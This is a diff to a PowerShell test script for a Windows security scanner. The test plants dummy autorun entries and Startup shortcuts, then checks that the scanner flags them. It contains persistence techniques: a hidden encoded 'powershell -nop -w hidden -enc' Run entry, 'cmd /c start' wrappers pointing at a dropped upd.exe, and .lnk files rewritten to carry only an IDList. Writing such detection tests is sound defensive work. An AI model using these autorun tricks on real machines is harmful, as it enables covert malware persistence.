@@ -67,6 +67,54 @@ $runName = 'SafetySecurityIT'
 # 네트워크 경로 자동 실행 (203.0.113.0/24는 문서용 주소라 실제로는 아무 데도 없어요). 검사기는 이 경로를 열면 안 돼요.
 $netName = 'SafetySecurityITNet'
 $netTarget = '\\203.0.113.5\ss-it\update.exe'
+# cmd /c start로 감싼 자동 실행: 감싼 cmd.exe가 아니라 실제로 실행되는 파일을 평가해야 해요.
+$evilExe = Join-Path $evilDir 'upd.exe'
+[IO.File]::WriteAllBytes($evilExe, $bytes)
+$wrapName = 'SafetySecurityITWrap'
+$wrapOkName = 'SafetySecurityITWrapOk'
+# 시작프로그램 폴더 바로가기 (Windows가 만든 진짜 .lnk로 파서를 확인해요)
+$startup = [Environment]::GetFolderPath('Startup')
+$lnkTemp = Join-Path $startup 'ss-it-temp.lnk'
+$lnkIdList = Join-Path $startup 'ss-it-idlist.lnk'
+$lnkOk = Join-Path $startup 'ss-it-ok.lnk'
+$lnkCmd = Join-Path $startup 'ss-it-cmd.lnk'
+
+function New-Shortcut([string]$Path, [string]$Target, [string]$Arguments = '') {
+    $shell = New-Object -ComObject WScript.Shell
+    $s = $shell.CreateShortcut($Path)
+    $s.TargetPath = $Target
+    $s.Arguments = $Arguments
+    $s.Save()
+}
+
+# 바로가기에서 LinkInfo와 상대 경로를 지워서 IDList(셸 항목)만 남겨요. 검사기가 IDList만으로 대상을 찾는지 확인해요.
+function Save-IdListOnlyShortcut([string]$Source, [string]$Dest) {
+    $b = [IO.File]::ReadAllBytes($Source)
+    $flags = [BitConverter]::ToUInt32($b, 0x14)
+    if (($flags -band 0x1) -eq 0) { throw "shortcut has no IDList: $Source" }
+    $out = New-Object 'System.Collections.Generic.List[byte]'
+    $out.AddRange([byte[]]$b[0..0x4B])
+    $pos = 0x4C
+    $idSize = [BitConverter]::ToUInt16($b, $pos)
+    $out.AddRange([byte[]]$b[$pos..($pos + 1 + $idSize)])
+    $pos += 2 + $idSize
+    if ($flags -band 0x2) { $pos += [BitConverter]::ToUInt32($b, $pos) }
+    $charSize = if ($flags -band 0x80) { 2 } else { 1 }
+    foreach ($bit in 0x4, 0x8, 0x10, 0x20, 0x40) {
+        if ($flags -band $bit) {
+            $len = 2 + [BitConverter]::ToUInt16($b, $pos) * $charSize
+            if ($bit -ne 0x8) { $out.AddRange([byte[]]$b[$pos..($pos + $len - 1)]) }
+            $pos += $len
+        }
+    }
+    if ($pos -lt $b.Length) { $out.AddRange([byte[]]$b[$pos..($b.Length - 1)]) }
+    $newFlags = [long]$flags
+    if ($newFlags -band 0x2) { $newFlags -= 0x2 }
+    if ($newFlags -band 0x8) { $newFlags -= 0x8 }
+    $bytesOut = $out.ToArray()
+    [BitConverter]::GetBytes([uint32]$newFlags).CopyTo($bytesOut, 0x14)
+    [IO.File]::WriteAllBytes($Dest, $bytesOut)
+}
 
 try {
     Write-Host "== 1. version / verify"
@@ -109,6 +157,12 @@ try {
     if (-not (Test-Path $runKey)) { New-Item -Path $runKey -Force | Out-Null }
     Set-ItemProperty -Path $runKey -Name $runName -Value 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AA=='
     Set-ItemProperty -Path $runKey -Name $netName -Value "`"$netTarget`" /silent"
+    Set-ItemProperty -Path $runKey -Name $wrapName -Value "cmd.exe /c start `"`" `"$evilExe`" -q"
+    Set-ItemProperty -Path $runKey -Name $wrapOkName -Value "`"$env:SystemRoot\System32\cmd.exe`" /c start `"`" `"$env:SystemRoot\System32\whoami.exe`""
+    New-Shortcut $lnkTemp $evilExe '-q'
+    Save-IdListOnlyShortcut $lnkTemp $lnkIdList
+    New-Shortcut $lnkOk '%SystemRoot%\System32\whoami.exe'
+    New-Shortcut $lnkCmd "$env:SystemRoot\System32\cmd.exe" "/c start `"`" `"$evilExe`""
     $r1 = Scan
     Check ($r1.Code -eq 0) 'scan exits 0'
     $rep1 = Latest-Report
@@ -128,6 +182,27 @@ try {
         Check (@($net[0].evidence | Where-Object { $_.key -eq '네트워크 위치' -and $_.value -eq '203.0.113.5' }).Count -eq 1) 'network-path finding names the host'
         Check (@($net[0].evidence | Where-Object { $_.key -eq '서명' -or $_.key -eq 'SHA-256' }).Count -eq 0) 'network-path file was not opened (no signature or hash)'
     }
+
+    $wrap = @($rep1.findings | Where-Object { $_.category -eq 'Autorun' -and $_.location -like "*\$wrapName" })
+    Check ($wrap.Count -eq 1 -and $wrap[0].severity -eq 'High') 'cmd /c start wrapped Run entry is High'
+    if ($wrap.Count -eq 1) {
+        Check ($wrap[0].target -eq $evilExe) "wrapped Run entry targets the real payload (got $($wrap[0].target))"
+    }
+    $wrapOk = @($rep1.findings | Where-Object { $_.category -eq 'Autorun' -and $_.location -like "*\$wrapOkName" })
+    Check ($wrapOk.Count -eq 0) 'cmd /c start of a signed Windows program is not reported'
+    foreach ($case in @(@{ Path = $lnkTemp; What = 'Windows-made shortcut' }, @{ Path = $lnkIdList; What = 'IDList-only shortcut' }, @{ Path = $lnkCmd; What = 'shortcut to cmd /c start' })) {
+        $lf = @($rep1.findings | Where-Object { $_.ruleId -eq 'RUN-002' -and $_.location -eq $case.Path })
+        Check ($lf.Count -eq 1 -and $lf[0].severity -eq 'High') "$($case.What) to a Temp payload is High"
+        if ($lf.Count -eq 1) {
+            Check ($lf[0].target -eq $evilExe) "$($case.What) targets the payload (got $($lf[0].target))"
+            Check (@($lf[0].reasons | Where-Object { "$_" -like '*실제 실행 대상이 달라요*' }).Count -eq 0) "$($case.What) is not mistaken for a disguised shortcut"
+        }
+    }
+    $lnkOkFindings = @($rep1.findings | Where-Object { $_.location -eq $lnkOk })
+    Check ($lnkOkFindings.Count -eq 0) "Windows-made shortcut to a signed program is not reported $(($lnkOkFindings | ForEach-Object { $_.reasons -join ' / ' }) -join ' | ')"
+    # 러너의 진짜 바로가기(시작 메뉴 등)를 대상 위장으로 잘못 보면 안 돼요.
+    $disguised = @($rep1.findings | Where-Object { @($_.reasons | Where-Object { "$_" -like '*실제 실행 대상이 달라요*' }).Count -gt 0 })
+    Check ($disguised.Count -eq 0) "no real shortcut on the runner is flagged as disguised ($(@($disguised.location) -join ', '))"
 
     Write-Host "== 4. second scan: same items are no longer new"
     $null = Scan
@@ -212,6 +287,9 @@ finally {
     Remove-Item -Path $comKey -Recurse -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path $runKey -Name $runName -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path $runKey -Name $netName -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path $runKey -Name $wrapName -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path $runKey -Name $wrapOkName -ErrorAction SilentlyContinue
+    Remove-Item -Force $lnkTemp, $lnkIdList, $lnkOk, $lnkCmd -ErrorAction SilentlyContinue
     Remove-Item -Recurse -Force $evilDir -ErrorAction SilentlyContinue
 }
 
